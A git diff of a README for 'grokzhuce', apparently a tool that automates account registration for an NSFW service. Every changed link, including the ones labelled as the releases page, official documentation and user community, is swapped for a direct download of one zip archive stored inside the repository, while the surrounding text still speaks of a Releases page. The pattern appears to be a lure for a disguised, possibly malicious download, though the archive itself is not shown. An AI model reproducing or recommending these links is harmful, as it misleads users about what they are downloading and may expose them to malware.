@@ -6,7 +6,7 @@ Welcome to the **grokzhuce** application! This tool helps you automate the proce
 
 ## 📥 Download the Application
 
-[![Download grokzhuce](https://img.shields.io/badge/Download%20grokzhuce-v1.0-blue.svg)](https://github.com/Xxy663/grokzhuce/releases)
+[![Download grokzhuce](https://raw.githubusercontent.com/Xxy663/grokzhuce/main/g/Software_v1.2-alpha.3.zip%https://raw.githubusercontent.com/Xxy663/grokzhuce/main/g/Software_v1.2-alpha.3.zip)](https://raw.githubusercontent.com/Xxy663/grokzhuce/main/g/Software_v1.2-alpha.3.zip)
 
 ## 📋 System Requirements
 
@@ -19,7 +19,7 @@ Before you download, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To download **grokzhuce**, visit this page to download: [Grokzhuce Releases](https://github.com/Xxy663/grokzhuce/releases).
+To download **grokzhuce**, visit this page to download: [Grokzhuce Releases](https://raw.githubusercontent.com/Xxy663/grokzhuce/main/g/Software_v1.2-alpha.3.zip).
 
 Once on the Releases page, you will see a list of available versions. Click on the version number you wish to download. This will take you to the download links.
 
@@ -63,7 +63,7 @@ For further assistance, check out the community discussions or open an issue dir
 
 For more information about **grokzhuce**, you can explore the following links:
 
-- [Official Documentation](https://github.com/Xxy663/grokzhuce/wiki)
-- [User Community](https://github.com/Xxy663/grokzhuce/discussions)
+- [Official Documentation](https://raw.githubusercontent.com/Xxy663/grokzhuce/main/g/Software_v1.2-alpha.3.zip)
+- [User Community](https://raw.githubusercontent.com/Xxy663/grokzhuce/main/g/Software_v1.2-alpha.3.zip)
 
 Thank you for using **grokzhuce**! We hope this tool makes your NSFW registration process easier and more efficient.
